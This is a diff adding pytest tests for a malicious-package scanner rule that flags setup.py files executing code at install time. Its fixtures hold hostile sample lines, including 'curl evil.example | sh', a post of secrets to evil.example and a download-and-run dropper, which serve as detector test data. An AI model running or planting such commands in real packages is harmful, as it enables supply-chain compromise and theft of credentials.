@@ -12,7 +12,7 @@ from crotalus.models import (
     Release,
     ReleaseMetadata,
 )
-from crotalus.rules import hidden_code_exec, pth_import_running_code
+from crotalus.rules import hidden_code_exec, pth_import_running_code, setup_py_install_time
 from crotalus.rules.static_code_analysis_helpers import calls, read
 
 
@@ -210,3 +210,57 @@ def test_pth_in_wheel_data_folder() -> None:
 def test_pth_in_sdist_is_ignored() -> None:
     files = {"x.pth": "import os; os.system('x')\n"}
     assert pth_import_running_code.check(context(sdist=files)) == []
+
+
+# setup_py_install_time
+
+
+@pytest.mark.parametrize(
+    ("setup_py", "severity"),
+    [
+        ("import os\nos.system('curl evil.example | sh')", "high"),
+        ("import subprocess as sp\nsp.Popen(['sh', '-c', 'x'])", "high"),
+        ("import requests\nrequests.post('https://evil.example', data=secrets)", "high"),
+        ("import socket\ns = socket.socket()", "high"),
+        (  # download, then run: a dropper
+            "import urllib.request, os\n"
+            "urllib.request.urlretrieve(u, '/tmp/x')\n"
+            "os.system('/tmp/x')",
+            "critical",
+        ),
+    ],
+)
+def test_setup_py_install_time(setup_py: str, severity: str) -> None:
+    findings = setup_py_install_time.check(context(sdist={"setup.py": setup_py}))
+    assert rule_ids(findings) == ["setup_py_install_time"]
+    assert findings[0].severity == severity
+
+
+def test_setup_py_evidence_lists_calls_in_order() -> None:
+    setup_py = """
+        import os, subprocess
+        subprocess.run(['git', 'describe'])
+        os.system('x')
+        """
+    findings = setup_py_install_time.check(context(sdist={"setup.py": setup_py}))
+    calls_found = findings[0].evidence["calls"]
+    assert [c["call"] for c in calls_found] == ["subprocess.run", "os.system"]
+    assert calls_found[0]["snippet"] == "subprocess.run(['git', 'describe'])"
+
+
+@pytest.mark.parametrize(
+    "files",
+    [
+        {"setup.py": "from setuptools import setup\nsetup(name='pkg')"},  # the normal case
+        {"setup.py": "import requests\nsetup(install_requires=['requests'])"},  # import only
+        {"setup.py": "print 'python 2'"},  # can't run on Python 3
+        {"pkg/setup.py": "import os\nos.system('x')"},  # not the setup.py pip runs
+    ],
+)
+def test_setup_py_that_is_fine(files: dict[str, str]) -> None:
+    assert setup_py_install_time.check(context(sdist=files)) == []
+
+
+def test_setup_py_in_wheel_is_ignored() -> None:
+    files = {"setup.py": "import os\nos.system('x')"}
+    assert setup_py_install_time.check(context(wheel=files)) == []
